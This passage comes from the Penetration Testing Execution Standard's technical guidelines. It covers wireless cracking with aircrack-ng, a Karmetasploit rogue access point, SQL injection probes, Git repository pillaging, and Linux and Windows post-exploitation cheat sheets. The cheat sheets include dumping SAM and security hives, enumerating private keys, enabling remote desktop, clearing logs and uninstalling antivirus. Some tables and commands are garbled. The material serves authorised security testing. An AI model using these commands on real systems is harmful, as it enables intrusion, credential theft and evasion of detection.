00:E0:4C:6D:27:8D wlan0 -5 means run the fragmentation attack -b 34:EF:44:BB:14:C1 is the access point MAC address -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication) wlan0 is the wireless interface name '''Attack 9: Injection test''' The injection test determines if your card can successfully inject wireless packets, and measures ping response times to APs. If you have two wireless cards connected, the test can also determine which specific injection attacks can be successfully executed. The basic injection test lists the APs in the area which respond to broadcast probes, and for each it performs a 30 packet test which measures the connection quality. This connection quality quantifies the ability of your card to successfully send and receive a response to the test target. The percentage of responses received gives a good indication of the link quality. aireplay-ng -9 wlan0 Where: -9 - Injection test. wlan0 - the interface name [[:File:Penetration_Testing_Execution_161.png|Screenshot Here]] '''Aircrack-ng''' Aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program. Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part of the Aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW approach (Pyshkin, Tews, and Weinmann). The default cracking method is PTW. For cracking WPA/WPA2 pre-shared keys, only a dictionary method is used. SSE2 support is included to dramatically speed up WPA/WPA2 key processing. A \"four-way handshake\" is required as input. For WPA handshakes, a full handshake is composed of four packets. However, Aircrack-ng is able to work successfully with just 2 packets. EAPOL packets (2 and 3) or packets (3 and 4) are considered a full handshake. Attacking the User The Rules of Engagment (ROE) should be validated to ensure this is in-scope before conducting any attacks against the users Karmetasploit Attacks Karmetasploit is a modification of the KARMA to integrate it into Metasploit. Karmetasploit creates a working \"evil\" access point working that provides network services to an unsuspecting user. The services Karmetasploit provides include a DNS daemon that responds to all requests, a POP3 service, an IMAP4 service, a SMTP service, a FTP service, a couple of different SMB services, and a web service. All DNS lookups result in the IP address of the access point being returned, resulting in a blackhole effect for all email, web, and other network traffic. To run Karmetasploit, use aireplay-ng to verify that injection is functioning: # aireplay-ng --test [monitor-interface] The output of aireplay-ng should indicate that injection is working and that one of the local access points could be reached. If every access point returns 0% and the message indicating injection is working is not there, you likely need to use a different/patched driver or a different wireless card. The Metasploit Framework does not have a DHCP module, so a third-party DHCP service must be configured and installed. The easiest way to accomplish this is by installed the \"dhcpd\" package. On Backtrack 4 R2, the package is called \"dhcpd3\"or on Backtrack 5, the package is called \"dhcp3-server\". apt-get install dhcp3-server Once the DHCP server has been installed, an appropriate configuration file needs to be created. This file is normally called \"dhcpd.conf\" or \"dhcpd3.conf\" and resides in /etc, /etc/dhcp, or /etc/dhcp3. The example below uses the 10.0.0.0/24 network with the access point configured at 10.0.0.1. default-lease-time 60; max-lease-time 72; ddns-update-style none; authoritative; log-facility local7; subnet 10.0.0.0 netmask 255.255.255.0 { range 10.0.0.100 10.0.0.254; option routers 10.0.0.1; option domain-name-servers 10.0.0.1; } To run Karmetasploit, there are three things that need to happen. First, airbase-ng must be started and configured as a greedy wireless access point. The following example will beacon the ESSID of the target company, respond to all probe requests, and rebroadcast all probes as beacons for 30 seconds: airbase-ng -P -C 30 -e \" \" -v [monitor-interface] Second, we need to configure the IP address of the at0 interface to match. ifconfig at0 up 10.0.0.1 netmask 255.255.255.0 Third, the DHCP server needs to be started on the \"at0\" TUN/TAP interface created by airbase-ng: dhcpd -cf /etc/dhcpd.conf at0 Finally, the Metasploit Framework itself needs to be configured. While its possible to configure each service by hand, its more efficient to use a resource file with the msfconsole interface. A sample resource file, configured to use 10.0.0.1 as the access point address, with nearly every feature enabled, can be downloaded here [ http://digitaloffense.net/tools/karma.rc ]. To use this resource file, run msfconsole with the -r parameter. Keep in mind that msfconsole must be run as root for the capture services to function. msfconsole -r karma.rc Once the Metasploit Framework processes the commands in the resource file, the standard msfconsole shell will be available for commands. As clients connect to the access point and try to access the network, the service modules will do what they can to extract information from the client and exploit browser vulnerabilities. DNS Requests < Contribution Needed > Bluetooth < Contribution Needed > Personalized Rogue AP < Contribution Needed > DoS / Blackmail angle Web A web application involves a web server that accepts input and is most often interfaced using http(s). The penetration tester\u2019s goal is to discover any interaction points that can be manipulated to access information, functionality or services beyond the web applications intended use. Quite often a web application will comprise of tiers. The tiers are generally broken up into web, application, and data. These tiers can run on one or more servers, and any of the tiers may be load balanced across multiple servers. In the quest to find all the entry points, during the intelligence gathering and vulnerability analysis phase the penetration tester will utilize mostly GET and POST requests but should also test head, put, delete, trace, options, connect and patch. The objective is to map all input and output points. These are not limited to simply forms on a page, but include cookies, links, hidden forms, http parameters, etc. During the exploration particular attention should be given to sessions, cookies, error pages, http status codes, indirectly accessible pages, encryption usage and server configuration, dns and proxy cache usage. Ideally, this will be done using both automated and manual methods to discover potential ways to manipulate the web application parameters or logic. This is generally done using some form of client application (browser) and a proxy that can sit between the client application and the web application, and a tool to crawl (aka spider) through page links. SQL Injection (SQLi) According to OWASP ( https://www.owasp.org/index.php/SQL_Injection ) SQL Injection, or as it is more commonly known SQLi, consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. SQL (Structured Query Language) is an interpretted programming language for interfacing with a database. It is sometimes also lazily used to refer to the database management system. Applications utilize a database to store/retrieve and process information. The database is usually a relational database, where data is stored in one more tables, each table has values in one or more columns (data types/attributes) and rows (element/tuple). There are several implementations of SQL and each has their own commands and syntax. A few common commands are: select - retrieve data union - combine results of two or more selects insert - add new data update - modify existing data delete - delete data What is injection? Simply stated, SQL injection exploits a vulnerability that allows data sent to an application to be interpreted and run as SQL commands. According to OWASP ( https://www.owasp.org/index.php/SQL_Injection ) SQL Injection, also known as SQLi, consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. SQL injection is typically discovered in the Vulnerability Analysis phase (and maybe hinted at in the intelligence gathering phase) of the engagement. One possible way to test for sql injection is to enter a ' into input fields then compare the application response to a well formed request. If the web application is vulnerable to SQLi, a ' may return different results when the SQL statement attempts to execute. Was an error message returned, different results, web page a different size, are different HTTP codes returned. Don't forget to look at the source, not just what is displayed in the browser. Depending on the reaction, it may be necessary to use other tests for injection, for example \" or '; or ) or '+\"#' or %27%20or%201#1. It may also be necessary to encode the characters to bypass filters. If the access to the source code of the application is available, review for any variables where input can be manipulated as part of the application usage. In some cases this will be readily apparent, for instance php sql # \"SELECT * from [table] WHERE tuple # ' sql # \"SELECT * from [table] WHERE tuple # ' _GET(\"input\"]'\"; c# $sql # \"SELECT * from [table] WHERE tuple # '\" + request.getParameter(\"input\") # \"'\"; Several tools are available for the identification and exploitation of SQLi Several tools are available for the identification and exploitation of SQLi. SQLi Tools *Havij ( http://itsecteam.com/en/projects/project1.htm ) *SQLmap ( http://sqlmap.sourceforge.net ) *The Mole ( http://sourceforge.net/projects/themole ) *Pangolin ( http://nosec.org/en/productservice/pangolin ) XSS < Contribution Needed > CSRF < Contribution Needed > Ad-Hoc Networks < Contribution Needed > Information Leakage Detection bypass < Contribution Needed > FW/WAF/IDS/IPS Evasion Human Evasion DLP Evasion Resistance of Controls to attacks < Contribution Needed > Type of Attack < Contribution Needed > Client Side Phishing (w/pretext) Service Side Out of band Post-Exploitation Infrastructure analysis The Social-Engineer Toolkit The Social-Engineering Toolkit (SET) is a python-driven suite of custom tools which solely focuses on attacking the human element of pentesting. It\u2019s main purpose is to augment and simulate social-engineering attacks and allow the tester to effectively test how a targeted attack may succeed. Currently SET has two main methods of attack, one is utilizing Metasploit payloads and Java-based attacks by setting up a malicious website (which you can clone whatever one you want) that ultimately delivers your payload. The second method is through file-format bugs and e-mail phishing. The second method supports your own open-mail relay, a customized sendmail open-relay, or Gmail integration to deliver your payloads through e-mail. The goal of SET is to bring awareness to the often forgotten attack vector of social-engineering. You can see detailed [ http://www.secmaniac.com/tutorials/ tutorials here] or by downloading the [ http://svn.secmaniac.com/social_engineering_toolkit/readme/User_Manual.pdf user manual here]. VPN detection VPN Hunter ( http://www.vpnhunter.com ) discovers and classifies SSL VPNs from top vendors including Juniper, Cisco, Palo Alto, Citrix, Fortinet, F5, SonicWALL, Barracuda, Microsoft, and Array. VPN Hunter will also attempt to detect whether two-factor authentication is enabled on the target SSL VPNs. Route detection, including static routes < Contribution Needed > Network Protocols in use < Contribution Needed > Proxies in use < Contribution Needed > * Network Level * Application Level Network layout < Contribution Needed > Mapping connectivity in/out of every segment Lateral connectivity High value/profile targets < Contribution Needed > Pillaging < Contribution Needed > Video Cameras < Contribution Needed > Data Exfiltration < Contribution Needed > identify web servers identify ftp servers DNS and ICMP tunnels VoIP channels Physical channels (printing, garbage disposal, courier) Fax (on multifunction printers) Locating Shares < Contribution Needed > Audio Capture < Contribution Needed > VoIP Microphone High Value Files < Contribution Needed > Database Enumeration < Contribution Needed > Checking for PPI card data passwords/user accounts Wifi < Contribution Needed > Steal wifi keys Add new Wifi entries with higher preference then setup AP to force connection Check ESSIDs to identify places visited Source Code Repos < Contribution Needed > SVN CVS MS Sourcesafe WebDAV Git Git is a distributed version control system (DVCS) and the meta directory (.git) contains all the necessary information to re-create the state of the repository at any given point in time. Git is often used to deploy web applications and the .git meta directory is sometimes available to pillage. '''Identify the repo''' One quick way to find the repo is to look for the file http://example.com/.git/HEAD and see if it contains a match to ^ref: refs/ W3AF ( http://w3af.sourceforge.net/ ) contains a discovery plugin named findGit.py that will assist in finding git repositories of web targets. Note: the .git directory is not always present in the root, but sometimes in sub directories depending on how a part of the application is deployed. Something like http://example.com/blog/.git/ '''Cloning the repo''' git clone http://example.com/ If an error like this is the result of the clone attempt then you have to resort to pillaging in different ways as the repo is not easily cloneable. fatal: http://example.com/info/refs not found: did you run git update-server-info on the server? '''Check for directory browsing''' If directory browsing is open for http://example.com/.git/objects then wget can be used to download the repo and then re-construct it. Example: wget -m \u2014no-parent http://example.com/.git cd example.com git reset \u2014hard '''Other useful data''' If both of these scenarios fail to get you the contents of the git repo there is still other information that may be of value. These files with predictable file names can contain very useful information and are detailed below. .git/index \u201cThe index is a binary file (generally kept in .git/index) containing a sorted list of path names, each with permissions and the SHA1 of a blob object; git ls-files can show you the contents of the index:\u201d ( http://book.git-scm.com/7_the_git_index.html ) Platform details (.php, .cgi, etc) Files that may contain configuration details (that are not rendered) .old .new .bak .tar.gz .txt Database dumps .sql mkdir example.com cd example.com mkdir .git wget get http://example.com/.git/index -O .git/index git init . git ls-files .git/config Contains repo locations, usernames / email addresses, possibly other targets one could attack. .git/logs/HEAD Contains commit messages if any editing and committing has been done on the server. .git/hooks/* There are a number of files in the hooks directory that may contain sensitive information depending on the environment. Identify custom apps < Contribution Needed > Backups < Contribution Needed > Locally stored backup files Central backup server Remote backup solutions Tape storage Business impact attacks < Contribution Needed > *What makes the biz money *Steal It Further penetration into infrastructure < Contribution Needed > *Botnets Pivoting inside Linux Commands --Show users that have used ssh to connect to this host. grep publickey /var/log/secure*|awk '{print 9\"\\t\" 9\"\\t\" 11\"\\t\"$NF}'|sort -u user1 ::ffff:10.0.0.1 ssh2 user2 ::ffff:10.0.0.2 ssh2 user3 ::ffff:10.0.0.3 ssh2 --Show users that have used sudo. grep sudo /var/log/secure*|awk -F: '{print $4}'|sort -u user1 root user2 user4 --Show users with active cron use. cat /var/log/cron* |awk '$6 !~ /Updated/ {print $6}'|tr -d ()|sort -u root user5 user1 user2 --Look at a users password settings. passwd -S user passwd -S appuser Password locked. passwd -S root Password set, MD5 crypt. passwd -S bin Alternate authentication scheme in use. --Users that have connected and from where. for i in $(ls /var/log/wtmp*);do last -adf {i}|awk ' {i}|awk ' 1 !~ /wtmp/ {print 1, 1, NF}'|sort -u; done user1 testhost.example.com root testhost2.example.com user2 prodhost.example.com --Who is logged in right now and from where. $ who -Hu NAME LINE TIME IDLE PID COMMENT user1 pts/0 Jun 2 10:39 . 28001 (testhost.example.com) --Pull IPv4 hosts from /etc/hosts, drop commented entries and localhost. egrep -v \"^[ \\t] #|^[ \\t] $|localhost\" /etc/hosts 10.0.0.1 testhost.example.com testhost 10.0.0.2 testhost2.example.com testhost2 10.0.0.3 testhost3.example.com testhost3 --Pull commented IPv4 hosts from /etc/hosts egrep \"^[ \\t] #+[ \\t] ([0-9]{1,3}.){3}[0-9]{1,3}\" /etc/hosts 10.0.0.4 testhost4.example.com testhost4 --Pull IPv6 hosts from /etc/hosts egrep \"(([:xdigit:]{0,4}):?:{1}){0,7}:?:{1}([:xdigit:]{0,4})?\" /etc/hosts ::1 loopback localhost # loopback (lo0) name/address ::1FFF ipv6test.example.com ipv6test --Pull hostnames from known_hosts files for any user home you have access to read. for i in $(awk -F: '{print $6}' /etc/passwd|sort -u); do awk '{print $1}' ${i}/.ssh/known_hosts 2> /dev/null;done|tr ',' '\\n'|sort -u testhost testhost3 testhost4 ipv6test prodhost --Show private keys and if they are encrypted for i in $(grep \"PRIVATE\" *|egrep -v \"END\"|awk -F: '{print $1}'); do print ${i};grep ENCRYPTED ${i};echo;done id_dsa id_dsap Proc-Type: 4,ENCRYPTED id_rsa32k Proc-Type: 4,ENCRYPTED id_rsa512 id_rsa512p Proc-Type: 4,ENCRYPTED --Look at the public keys and pull their type. Numerical types are SSH protocol 1. for i in $(ls *.pub);do print ${i};awk '{print $1}' ${i};echo;done id_dsa.pub ssh-dss id_dsap.pub ssh-dss id_rsa16k.pub ssh-rsa id_rsadef.pub ssh-rsa identity2048.pub 2048 identity768p.pub 768 identity864.pub 864 Windows Commands Token Stealing and Reuse Password Cracking Wifi connections to other devices Password Reuse Keyloggers User enumeration From Windows DC or from individual machines Linux passwd file MSSQL Windows Auth users History/Logs Linux {| | align#\"left\"| date |Display date and time |- | df |Display disk free space |- | iostat |Kernel I/O statistics |- | netstat |Network status and throughput |- | lsof |List of open files |- | ps |Process information |- | top |Display and update sorted process information |- | who |Display who is on the system Check ssh known hosts file Log files to see who connects to the server |- |} .bash_history and other shell history files syslog MySQL * MySQL History * syslog Windows * Event Logs * Recent opened files * Browsers * Favorites * stored passwords * stored cookies * browsing history * browser cache files * syslog Cleanup < Contribution Needed > *Ensure documented steps of exploitation *Ensure proper cleanup *Remove Test Data *Leave no trace *Proper archiving and encryption of evidence to be handed back to customer *Restore database from backup where necessary Persistence < Contribution Needed > Autostart Malware Reverse Connections Rootkits User Mode Kernel Based C&C medium (http, dns, tcp, icmp) Backdoors Implants VPN with credentials Post Exploitation Post-exploitation activities are those that are conducted once a system as been compromised. These activities vary based upon the type of operating system. They can very from running simple \"whoami\" to enumerating local accounts. Windows Post Exploitation Blind Files (Things to pull when all you can do is to blindly read) LFI/Directory traversal(s). Files that will have the same name across networks / Windows domains / systems. {| ! align#\"left\"| File ! Expected Contents / Description |- | %SYSTEMDRIVE%\\boot.ini |A file that can be counted on to be on virtually every windows host. Helps with confirmation that a read is happening. |- | %WINDIR%\\win.ini |This is another file to look for if boot.ini isn\u2019t there or coming back, which is some times the case. |- | %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM |It stores users' passwords in a hashed format (in LM hash and NTLM hash). |- | %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\RegBack\\system | |} Non Interactive Command Execution {| ! align#\"left\"| ! |- ! | |} System {| ! align#\"left\"|Command ! Expected Output or Description |- | |Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1. |- | whoami /all |Lists current user, sid, groups current user is a member of and their sids as well as current privilege level. |- | set |Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE. |- | fsutil fsinfo drives |Must be an administrator to run this, but it lists the current drives on the system. |- | reg query HKLM /s /d /f \"C:* *.exe\" | find /I \"C:\\\" | find /V \"\"\"\" |Locates insecurely registered executables within the system registry on Windows 7. |} Networking (ipconfig, netstat, net) {| ! align#left\"|Command ! Expected Output or Description |- | ipconfig /all |Displays the full information about your NIC\u2019s. |- | ipconfig /displaydns |Displays your local DNS cache. |- | netstat -nabo | |- | netstat -s -p [tcp|udp|icpm|ip] | |- | netstat -r | |- | netstat -na | findstr :445 | |- | netstat -nao | findstr LISTENING |XP and up for -o flag to get PIDnet acc |- | netstat -nao | findstr LISTENING |XP and up for -o flag to get PID |- | netstat -na | findstr LISTENING | |- | netsh diag show all | |- | net view |Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup. |- | net view /domain net view /domain:otherdomain | |- | net user %USERNAME% /domain |Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership |- | net user /domain |Lists all of the domain users |- | net accounts |Prints the password policy for the local system. This can be different and superseded by the domain policy. |- | net accounts /domain |Prints the password policy for the domain |- | net localgroup administrators |Prints the members of the Administrators local group |- | net localgroup administrators /domain |As this was supposed to use localgroup & domain, this actually another way of getting current domain admins |- | net group \u201cDomain Admins\u201d /domain |Prints the members of the Domain Admins group |- | net group \u201cEnterprise Admins\u201d /domain |Prints the members of the Enterprise Admins group |- | net group \u201cDomain Controllers\u201d /domain |Prints the list of Domain Controllers for the current domain |- | nbtstat -a [ip here] | |- | net share |Displays your currently shared SMB entries, and what path(s) they point to |- | net session | find / \u201c\\\u201d | |- | arp -a |Lists all the systems currently in the machine\u2019s ARP table. |- | route print |Prints the machine\u2019s routing table. This can be good for finding other networks and static routes that have been put in place |- | browstat |Not working on XP | |} http://www.securityaegis.com/ntsd-backdoor/ Configs {| ! align#left\"|Command ! Expected Output or Description |- | gpresult /z |Extremely verbose output of GPO (Group policy) settings as applied to the current system and user |- | sc qc | |- | sc query | |- | sc queryex | |- | type %WINDIR%\\System32\\drivers\\etc\\hosts | Print the contents of the Windows hosts file |- | dir %PROGRAMFILES% |Prints a directory listing of the Program Files directory. |- | echo %COMSPEC% |Usually going to be cmd.exe in the Windows directory, but it\u2019s good to know for sure. |} Finding Important Files {| ! align#left\"|Command ! Expected Output or Description |- | tree C: /f /a > C:\\output_of_tree.txt |Prints a directory listing in \u2018tree\u2019 format. The /a makes the tree printed with ASCII characters instead of special ones and the /f displays file names as well as folders |- | dir /a | |- | dir /b /s [Directory or Filename] | |- | dir /s /b | find /I \u201csearchstring\u201d |Searches the output of dir from the root of the drive current drive () and all sub drectories (/s) using the \u2018base\u2019 format (/b) so that it outputs the full path for each listing, for \u2018searchstring\u2019 anywhere in the file name or path. |- | command | find /c /v \u201c\u201d |Counts the lines of whatever you use for \u2018command\u2019 | |} Files To Pull (if possible) {| ! align#left\"|File location !Description / Reason |- | %SYSTEMDRIVE%\\pagefile.sys |Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size |- | %WINDIR%\\debug\\NetSetup.log | |- | %WINDIR%\\repair\\sam | |- | %WINDIR%\\repair\\system | |- | %WINDIR%\\repair\\software | |- | %WINDIR%\\repair\\security | |- | %WINDIR%\\iis6.log |iis5.log, ii6.log or iis7.log | |- | %WINDIR%\\system32\\logfiles\\httperr\\httperr1.log |IIS 6 error log |- | %SystemDrive%\\inetpub\\logs\\LogFiles |IIS 7\u2019s logs location |- | %WINDIR%\\system32\\logfiles\\w3svc1\\exYYMMDD.log |Year month day |- | %WINDIR%\\system32\\config\\AppEvent.Evt | |- | %WINDIR%\\system32\\config\\SecEvent.Evt | |- | %WINDIR%\\system32\\config\\default.sav | |- | %WINDIR%\\system32\\config\\security.sav | |- | %WINDIR%\\system32\\config\\software.sav | |- | %WINDIR%\\system32\\config\\system.sav | |- | %WINDIR%\\system32\\CCM\\logs*.log | |- | %USERPROFILE%\\ntuser.dat | |- | %USERPROFILE%\\LocalS 1\\Tempor 1\\Content.IE5\\index.dat | |- | %WINDIR%\\System32\\drivers\\etc\\hosts | |} Remote System Access#### {| ! align#left\"|Command !Description / Reason |- | net share \\computername | |- | tasklist /V /S computername | |- | qwinsta /SERVER:computername | |- | qprocess /SERVER:computername * | |- | net use \\computername |This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed |- | net use \\computername /user:DOMAIN\\username password |Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system. This is useful when you\u2019ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on. |- | reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f |Enable remote desktop. |- | reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f |Enable remote assistance |- | net time \\computername |Shows the time of target computer) |- | dir \\computername\\share_or_admin_share |dir list a remote directory |- | tasklist /V /S computername |Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount |} Auto-Start Directories ver Returns kernel version - like uname on *nix) {| ! align#left\"|Version !Location |- |Windows NT 6.1, 6.0 |%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ |- |Windows NT 5.2, 5.1, 5,0 |%SystemDrive%\\Documents And Settings\\All Users\\Start Menu\\Programs\\StartUp\\ |- |Windows 9x |%SystemDrive%\\wmiOWS\\Start Menu\\Programs\\StartUp\\ |- |Windows NT 4.0, 3.51, 3.50 |%SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\StartUp\\ |} Binary Planting {| ! align#left\"|Location / File name !Reason / Description |- | msiexec.exe |Idea taken from here: http://goo.gl/E3LTa - basically put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying path, you get code execution. |- | %SystemRoot%\\System32\\wbem\\mof\\ |Taken from stuxnet: http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf Look for Print spooler vuln |} WMI * wmic bios wmic ** wmic qfe get hotfixid ***This gets patches IDs ** wmic startup ** wmic service ** wmic process ***Get caption,executablepath,commandline ** wmic process call create \u201cprocess_name\u201d ***Executes a program wmic process where name#\u201dprocess_name\u201d call terminate ***Terminates program ** wmic logicaldisk where drivetype#3 get name, freespace, systemname, filesystem, size, volumeserialnumber ***Hard drive information ** wmic useraccount ***Usernames, sid, and various security related goodies ** wmic useraccount get /ALL ** wmic share get /ALL ***You can use ? for gets help ** wmic startup list full ***This can be a huge list!!! ** wmic /node:\"hostname\" bios get serialnumber ***This can be great for finding warranty info about target Reg Command exit * reg save HKLM\\Security security.hive (Save security hive to a file) ** reg save HKLM\\System system.hive (Save system hive to a file) ** reg save HKLM\\SAM sam.hive (Save sam to a file) ** reg add [\\TargetIPaddr] [RegDomain][ \\Key ] ** reg export [RegDomain][Key] [FileName] ** reg import [FileName ] ** reg query [\\TargetIPaddr] [RegDomain][ Key ] /v [Valuename!] (you can to add /s for recurse all values ) Deleting Logs wevtutil el (list logs) wevtutil cl (Clear specific lowbadming) del %WINDIR%*.log /a /s /q /f Uninstalling Software \u201cAntiVirus\u201d (Non interactive) wmic product get name /value (this gets software names) wmic product where name#\"XXX\" call uninstall /nointeractive (this uninstalls software) Other pkgmgr usefull /iu :\u201dPackage\u201d pkgmgr usefull /iu :\u201dTelnetServer\u201d (Install Telnet Service ...) pkgmgr /iu:\u201dTelnetClient\u201d (Client ) rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-) wscript.exe","title":"Technical Guidelines"},{"location":"pentest_standard/tecguidelines/#tools-required","text":"Selecting the tools required during a penetration test depends on several factors such as the type and the depth of the engagement. In general terms, the following tools are mandatory to complete a penetration test with the expected results.","title":"Tools Required"},{"location":"pentest_standard/tecguidelines/#operating-systems","text":"Selecting the operating platforms to use during a penetration test is often critical to the successfully exploitation of a network and associated system. As such it is a requirement to have the ability to use the three major operating systems at one time. This is not possible without virtualization.","title":"Operating Systems"},{"location":"pentest_standard/tecguidelines/#macos-x","text":"MacOS X is a BSD-derived operating. With standard command shells (such as ''sh'', ''csh'', and ''bash'') and native network utilities that can be used during a penetration test (including ''telnet'', ''ftp'', ''rpcinfo'', ''snmpwalk'', ''host'', and ''dig'') it is the system of choice and is the underlying host system for our penetration testing tools. Since this is a hardware platform as well, this makes the selection of specific hardware extremely simple and ensures that all tools will work as designed.","title":"MacOS X"},{"location":"pentest_standard/tecguidelines/#vmware-workstation","text":"VMware Workstation is an absolute requirement to allow multiple instances of operating systems easily on a workstation. VMware Workstation is a fully supported commercial package, and offers encryption capabilities and snapshot capabilities that are not available in the free versions available from VMware. Without the ability to encrypt the data collected on a VM confidential information will be at risk, therefore versions that do not support encryption are not to be used. The operating systems listed below should be run as a guest system within VMware.","title":"VMware Workstation"},{"location":"pentest_standard/tecguidelines/#linux","text":"Linux is the choice of most security consultants. The Linux platform is versatile, and the system kernel provides low-level support for leading-edge technologies and protocols. All mainstream IP-based attack and penetration tools can be built and run under Linux with no problems. For this reason, BackTrack is the platform of choice as it comes with all the tools required to perform a penetration test.","title":"Linux"},{"location":"pentest_standard/tecguidelines/#windows-xp7","text":"Windows XP/7 is required for certain tools to be used. Many commercial tools or Microsoft specific network assessment and penetration tools are available that run cleanly on the platform.","title":"Windows XP/7"},{"location":"pentest_standard/tecguidelines/#radio-frequency-tools","text":"","title":"Radio Frequency Tools"},{"location":"pentest_standard/tecguidelines/#frequency-counter","text":"A Frequency Counter should cover from 10Hz- 3 GHz. A good example of a reasonably priced frequency counter is the MFJ-886 Frequency Counter.","title":"Frequency Counter"},{"location":"pentest_standard/tecguidelines/#frequency-scanner","text":"A scanner is a radio receiver that can automatically tune, or scan, two or more discrete frequencies, stopping when it finds a signal on one of them and then continuing to scan other frequencies when the initial transmission ceases. These are not to be used in Florida, Kentucky, or Minnesota unless you are a person who holds a current amateur radio license issued by the Federal Communications Commission. The required hardware is the Uniden BCD396T Bearcat Handheld Digital Scanner or PSR-800 GRE Digital trunking scanner.","title":"Frequency Scanner"},{"location":"pentest_standard/tecguidelines/#spectrum-analyzer","text":"A spectrum analyzer is a device used to examine the spectral composition of some electrical, acoustic, or optical waveform. A spectrum analyzer is used to determine whether or not a wireless transmitter is working according to federally defined standards and is used to determine, by direct observation, the bandwidth of a digital or analog signal. A good example of a reasonably priced spectrum analyzer is the Kaltman Creations HF4060 RF Spectrum Analyzer.","title":"Spectrum Analyzer"},{"location":"pentest_standard/tecguidelines/#80211-usb-adapter","text":"An 802.11 USB adapter allow for the easy connection of a wireless adapter to the penetration testing system. There are several issues with using something other than the approved USB adapter as not all of them support the required functions. The required hardware is the Alfa AWUS051NH 500mW High Gain 802.11a/b/g/n high power Wireless USB.","title":"802.11 USB adapter"},{"location":"pentest_standard/tecguidelines/#external-antennas","text":"External antennas come in a variety of shapes, based upon the usage and with a variety of connectors. All external antennas must have RP-SMA connectors that are compatible with the Alfa. Since the Alfa comes with an Omni-directional antenna, we need to obtain a directional antenna. The best choice is a panel antenna as it provides the capabilities required in a package that travels well. The required hardware is the L-com 2.4 GHz 14 dBi Flat Panel Antenna with RP-SMA connector. A good magnetic mount Omni-directional antenna such as the L-com 2.4 GHz/900 MHz 3 dBi Omni Magnetic Mount Antenna with RP-SMA Plug Connector is a good choice.","title":"External Antennas"},{"location":"pentest_standard/tecguidelines/#usb-gps","text":"A GPS is a necessity to properly perform an RF assessment. Without this it's simply impossible to determine where and how far RF signals are propagating. There are numerous options are available, therefore you should look to obtain a USB GPS that is supported on operating system that you are using be that Linux, Windows and Mac OS X.","title":"USB GPS"},{"location":"pentest_standard/tecguidelines/#software","text":"The software requirements are based upon the engagement scope, however we ' ve listed some commercial and open source software that could be required to properly conduct a full penetration test. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Software''' | '''URL''' | '''Description''' | '''Windows Only''' |- |Maltego | http://www.paterva.com/web5 |The defacto standard for mining data on individuals and companies. Comes in a free community version and paid version. | |- |Nessus | http://tenable.com/products/nessus |A vulnerabilty scanning tool available in paid and free versions. Nessus is useful for finding and documenting vulnerabilities mostly from the inside of a given network. | |- |IBM AppScan | http://www-01.ibm.com/software/awdtools/appscan |IBM's automated Web application security testing suite. |'''*''' |- |eEye Retina | http://www.eeye.com/Products/Retina.aspx |Retina is an an automated network vulnerability scanner that can be managed from a single web-based console. It can be used in conjunction with Metasploit where if an exploit exists in Metasploit, it can be launched directly from Retina to verify that the vulnerability exists. | |- |Nexpose | http://www.rapid7.com |Nexpose is a vulnerability scanner from the same company that brings you Metasploit. Available in both free and paid versions that differ in levels of support and features. | |- |OpenVAS | http://www.openvas.org |OpenVAS is a vulnerability scanner that originally started as a fork of the Nessus project. The actual security scanner is accompanied with a daily updated feed of Network Vulnerability Tests (NVTs), over 20,000 in total (as of January 2011) | |- |HP WebInspect | https://www.fortify.com/products/web_inspect.html |HP WebInspect performs web application security testing and assessment for complex web applications. Supports JavaScript, Flash, Silverlight and others. |'''*''' |- |HP SWFScan | https://h30406.www3.hp.com/campaigns/2009/wwcampaign/1-5TUVE/index.php?key#swf |HP SWFScan is a free tool developed by HP Web Security Research Group to automatically find security vulnerabilities in applications built on the Flash platform. Useful for decompiling flash apps and finding hard-coded credentials, etc. |'''*''' |- |Backtrack Linux |[ http://www.backtrack-linux.org ] |One of the most complete penetration testing Linux distributions available. Includes many of the more popular free pentesting tools but is based on Ubuntu so it's also easily expandable. Can be run on Live CD, USB key, VM or installed on a hard drive. | |- |SamuraiWTF (Web Testing Framework) | http://samurai.inguardians.com |A live 